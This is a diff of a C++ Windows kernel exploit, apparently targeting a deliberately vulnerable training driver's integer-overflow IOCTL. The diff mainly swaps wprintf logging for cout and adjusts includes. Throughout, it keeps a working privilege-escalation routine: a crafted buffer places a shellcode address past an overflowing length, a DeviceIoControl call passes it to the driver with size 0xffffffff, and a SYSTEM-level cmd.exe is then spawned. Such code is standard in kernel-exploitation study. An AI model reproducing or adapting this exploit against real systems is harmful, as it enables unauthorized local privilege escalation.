@@ -1,11 +1,14 @@
 #include <Windows.h>
+#include <iostream>
+
 #include "Solutions.h"
 #include "ioctal_codes.h"
-#include "stdio.h"
 #include "random_str.h"
-#include "TokenStealingShellcode.h"
+#include "utils.h"
 
-DWORD Solutions::TriggerIntegerOverflow() {
+using namespace std;
+
+NTSTATUS Solutions::TriggerIntegerOverflow() {
 	DWORD dwBufSize = 0x828;
 	DWORD lTerminatorValue = 0xBAD0B0B0;
 	PUCHAR lpInBuffer = NULL;
@@ -15,7 +18,7 @@ DWORD Solutions::TriggerIntegerOverflow() {
 
 	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize + sizeof(PULONG) * 2);
 	if (!lpInBuffer) {
-		wprintf(L"[-] Could not allocate buffer :(\n");
+		cout << "[-] Could not allocate buffer :(" << endl;
 		return 1;
 	}
 
@@ -23,16 +26,16 @@ DWORD Solutions::TriggerIntegerOverflow() {
 	*(PULONG)(lpInBuffer + dwBufSize) = (ULONG)pEopPayload;
 	*(PULONG)(lpInBuffer + dwBufSize + 4) = lTerminatorValue;
 
-	wprintf(L"[+] Prepering to jump to shellcode - 0x%x\n", (ULONG)pEopPayload);
+	cout << "[+] Prepering to jump to shellcode - " << hex << (ULONG)pEopPayload << endl;
 
 	if (!DeviceIoControl(_hDeviceHandle, dwIoctl, (LPVOID)lpInBuffer, 0xffffffff,
 		NULL, NULL, &dwBytesReturned, NULL)) {
-		wprintf(L"[-] Could not talk with the driver :(\n");
+		cout << "[-] Could not talk with the driver - " << GetLastError() << endl;
 		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
 		return 1;
 	}
 
-	wprintf(L"[+] Succesfully talked with the driver\n");
+	cout << "[+] Succesfully talked with the driver" << endl;
 
 	system("cmd.exe");
 
